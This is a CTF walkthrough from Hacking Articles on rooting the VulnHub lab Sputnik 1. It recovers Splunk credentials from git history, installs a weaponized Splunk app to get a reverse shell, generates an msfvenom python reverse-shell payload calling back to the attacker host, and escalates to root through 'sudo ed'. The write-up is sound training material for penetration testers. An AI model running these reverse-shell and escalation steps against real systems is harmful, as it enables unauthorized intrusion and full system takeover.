@@ -1,0 +1,109 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Sputnik 1: Vulnhub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/sputnik-1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-05-19T16:13:03+00:00">May 19, 2019</time><time class="updated" datetime="2025-06-10T20:11:41+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we will be solving a boot2root lab from Vulnhub called Sputnick:1. This lab, like many others, is a good way to keep your penetration testing skills sharp while getting some variety.</span></p>
+<p><span style="color: #000000;"><strong>Level:</strong> Easy</span></p>
+<p><span style="color: #000000;"><strong>Task:</strong> To find flag.txt</span></p>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<p><span style="color: #000000;"><strong>Scanning</strong> </span></p>
+<ul>
+<li><span style="color: #000000;">Open ports and Running services (Nmap)</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration </strong></span></p>
+<ul>
+<li><span style="color: #000000;">Web Directory search </span></li>
+<li><span style="color: #000000;">Credential harvesting</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploitation </strong></span></p>
+<ul>
+<li><span style="color: #000000;">Splunk reverse and bind shell</span></li>
+<li><span style="color: #000000;">Python reverse shell</span></li>
+<li><span style="color: #000000;">Accessing shell</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Capture flag.txt</span></li>
+</ul>
+<h3><span style="color: #800000;">Scanning</span></h3>
+<p><span style="color: #000000;">We start by scanning the network for targets using Netdiscover</span></p>
+<pre class="lang:default decode:true">netdiscover</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1j7Grz4HJUs/XOF9v7ditLI/AAAAAAAAeas/1P-l6fxMX9A13kJXeFA5kncZ97_PI2NogCLcBGAs/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">So we found target IP 192.168.1.103 and proceed by running a Nmap scan for all its ports to see what we can find.</span></p>
+<pre class="lang:default decode:true">nmap -p- -A 192.168.1.103</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-F6CWgii-tsg/XOF9zFs9PuI/AAAAAAAAebU/h_PiyPgSsZAGjpDG0JNB1gkehlgebB8mQCLcBGAs/s1600/2.png"/></span></p>
+<h3><span style="color: #800000;">Enumeration</span></h3>
+<p><span style="color: #000000;">The scan shows us we have port 8089, 8191, 55555 and 61337 open. Port 55555 has an associated IP address and a directory link for git repository; we investigate it to see what we can find. We copy and paste it into our browser.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-8yuB-9f-aT0/XOF9zOQIoFI/AAAAAAAAebY/IuV07gngpV44cjFlt_NummBJSraFULsEACLcBGAs/s1600/3.1.png"/></span></p>
+<p><span style="color: #000000;">We access the “Logs” directory and click on the “HEAD” file within.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-KHymP7AfsDU/XOF9ztJT80I/AAAAAAAAebc/Z1X2XcY7YKwLVme9w07c7Uiqu8VNTsTcgCLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">There is a link for a Git page, we go to the link and find Flappy. Git clone is used to clone and download the file to our system for further investigation.</span></p>
+<p><span style="color: #000000;">Once the file in downloaded we explore its contents but nothing stands out, so we access their logs.</span></p>
+<pre class="lang:default decode:true">git clone https://github.com/ameerpornillos/flappy
+git log</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-eozFHcq8wXc/XOF90N32pRI/AAAAAAAAebg/supBLxX1WVcuG53Zvzq-Fd214Cc6CQ-7gCLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">We see that the command gave us the logs for our file and the search starts. We focus on the commit’s and start searching through them.</span></p>
+<p><span style="color: #000000;">Finally, we come across the highlighted commit and strike gold!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gEehsrseOIA/XOF90pRpJTI/AAAAAAAAebo/Dy0lrNh2DBQmqqIE9N5Ah7M3s266MIe0gCLcBGAs/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">We use the “ls-tree” to get an indented listing of the file.</span></p>
+<p><span style="color: #000000;">The screenshot shows a file named “secret”; we used the git show command on its string to see what is reveals</span></p>
+<pre class="lang:default decode:true">git ls-tree 07fda135aae22fa7869b3de9e450ff7cacfbc717
+git show f4385198ce1cab56e0b2a1c55e8863040045b085</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-Awsrmh6yhPs/XOF90b7h5jI/AAAAAAAAebk/Bfgh8nTOiA8PF2faFksHBNwLv77TMWZ3QCLcBGAs/s1600/6.png"/></strong></span></p>
+<p><span style="color: #000000;">Now, what could this be? We recalled seeing a Splunk service running on port 61337, we accessed it on our browser to find a login screen for Splunk.</span></p>
+<pre class="lang:default decode:true">192.168.1.103:61337</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Xvk7gRxQudE/XOF91mpTkmI/AAAAAAAAeb0/hUwJFJ92nF4HI-jzuZ7JxvkI90_60Bi9QCLcBGAs/s1600/7.png"/></span></p>
+<h3><span style="color: #800000;">Exploitation (Splunk)</span></h3>
+<p><span style="color: #000000;">The information we got earlier from the previous screenshot is in fact login credentials. The username is “sputnik” and the password is “ameer_says_thank_you_and_god_job”, we enter these and are able to get into the Splunk account.</span></p>
+<p><span style="color: #000000;">We looked around for a while and then decided to upload a shell to the account. On searching, we found a way to weaponize Splunk with reverse and bind shell from <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/TBGSecurity/splunk_shells">https://github.com/TBGSecurity/splunk_shells</a></span></span></p>
+<p><span style="color: #000000;">The .gz file from the link was saved on our system, we navigate to the “App: Search &amp; Reporting” option and click on “Search &amp; Reporting”</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kbQctmdprok/XOF91Iy-QeI/AAAAAAAAebs/y59iIiAWwFQH02GSPTRLjGvBp29RlPuRgCLcBGAs/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">Click on the “Install app from file” option.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-d4_PYVROQYw/XOF91XotuMI/AAAAAAAAebw/8ACdqrOtD4AozeaObS0PVyevzysRptPOgCLcBGAs/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">Using the browse option, we find our shell, select it and upload it.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4fMa98jqbQM/XOF9v2xqZ_I/AAAAAAAAeao/pABSgpLhT0Mvw_PSjdyybMkw0waW5F3QQCLcBGAs/s1600/10.1.png"/></span></p>
+<p><span style="color: #000000;">Click on the “Restart Now” to restart the application.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ns1pygXp06I/XOF9wKpSTOI/AAAAAAAAeaw/3MkowIm7P_cyPWdfjxQeWfxCq2DLUlJhwCLcBGAs/s1600/10.2.png"/></span></p>
+<p><span style="color: #000000;">We scroll down to find our shell file as shown below. Before we can run, it we need to click on the “Permissions” option to change its permissions.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-a5QLHY6EAAY/XOF9wnmo-fI/AAAAAAAAea0/5f3tKLfblP4lLnI0Z6ClM1erDMF8dB1tACLcBGAs/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">Configuration files need to be added in order to run the shell successfully, here we set permission to everyone and at the bottom, we click on the “All apps” radio button and save this change.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-JyJIA6PqZL4/XOF9w___7rI/AAAAAAAAea4/ptclkTXWWkoj0JVaSu6o6Xt1pNJbAhSxgCLcBGAs/s1600/11.png"/></span></p>
+<p><span style="color: #000000;">Now to execute the shell. We navigate to the search option in Splunk and type in our command defining that we want a reverse shell of standard type to talk to out attach machines IP on the listening port.</span></p>
+<pre class="lang:default decode:true">| revshell std 192.168.1.110 1234</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-JLnYBPZQ1vM/XOF9xNriiuI/AAAAAAAAea8/vhGTcFKrDzE8vwXcbzPKYMhBeWQJ0zfcwCLcBGAs/s1600/12.png"/></span></p>
+<h3><span style="color: #800000;">Access Victim’s Shell</span></h3>
+<p><span style="color: #000000;">Netcat is running on our machine listening on port 1234 and see shell talking back.</span></p>
+<p><span style="color: #000000;">The “id” command was used to no avail so we decided to step it up a notch.</span></p>
+<pre class="lang:default decode:true">nc -lvp 1234</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-17hnJt5fqYs/XOF9xTOwegI/AAAAAAAAebA/LigDmnz3TeImLDUJ8FBMfwJtAqbwy5ZBwCLcBGAs/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">We used Msfvenom to create a python payload.</span></p>
+<pre class="lang:default decode:true">msfvenom -p cmd/unix/reverse_python lhost=192.168.1.110 lport=4444 R</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-uSRDaoaTVZc/XOF9yBS-62I/AAAAAAAAebE/en5R2N4bps8Ex9VytZ1soixumjJDicgxwCLcBGAs/s1600/14.png"/></span></p>
+<p><span style="color: #000000;">The payload is uploaded through our existing Netcat session, all that needed to be done was the payload to be pasted into the terminal and executed.</span></p>
+<pre class="lang:default decode:true">nc -lvp 1234</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-oUEBN9VyWsA/XOF9yVMeaZI/AAAAAAAAebI/c1EKDcJ3XtQmynrGlA6ndnGV5nBMK5K6QCLcBGAs/s1600/15.png"/></span></p>
+<p><span style="color: #000000;">A new Netcat session is started on the port (4444) that we defined in our payload and we see the execution occur flawlessly.</span></p>
+<h3><span style="color: #800000;">Privilege Escalation</span></h3>
+<p><span style="color: #000000;">We run the “id” command to see that our user is “splunk”.</span></p>
+<p><span style="color: #000000;">Time privilege escalation. On the splunk prompt, we first run the “sudo -l” command and enter the password that we used earlier to log into Splunk “ameer_says_thank_you_and_good_job” where we found splunk user can ed as root.</span></p>
+<p><span style="color: #000000;">So close to root! Now, all we have to do is run the “sudo ed” command and then the “<strong>!/bin/sh</strong>” command. Type in “id” and there you go! We have root!</span></p>
+<pre class="lang:default decode:true">id
+sudo -l
+ameer_says_thank_you_and_good_job
+sudo ed
+!/bin/sh</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-6fRPpYhru-g/XOF9yZ-PUUI/AAAAAAAAebM/K70ojEp5OoMKgHx31sCM3M9ubOkhnstZQCLcBGAs/s1600/16.png"/></span></p>
+<p><span style="color: #000000;">Time to look for our flag.</span></p>
+<p><span style="color: #000000;">We look in the root directory to find “flag.txt” and use “cat” to open it. Hooray for us!</span></p>
+<p><span style="color: #000000;">As always, we at Hacking Articles hope you enjoy this lab and share it with your collogues. This lab has a great feature that gives you an insight into exploiting Splunk. Overall the lab is easy and the level of frustration it might induce is minimal.</span></p>
+<p><span style="color: #000000;">Have fun and stay ethical.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-k8kOSLB-WD0/XOF9y8Q6JPI/AAAAAAAAebQ/F-E35jHpI-8ANMAsQ1IrCpzkPqSvi9SuQCLcBGAs/s1600/17.png"/></span></p>
+<p><span style="color: #000000;"><strong>About The Author</strong></span></p>
+<p><span style="color: #000000;">Abhimanyu Dev is a Certified Ethical Hacker, penetration tester, information security analyst and researcher. Connect with him <strong><u><a style="color: #000000;" href="https://www.linkedin.com/in/abhimanyudev">here</a></u></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
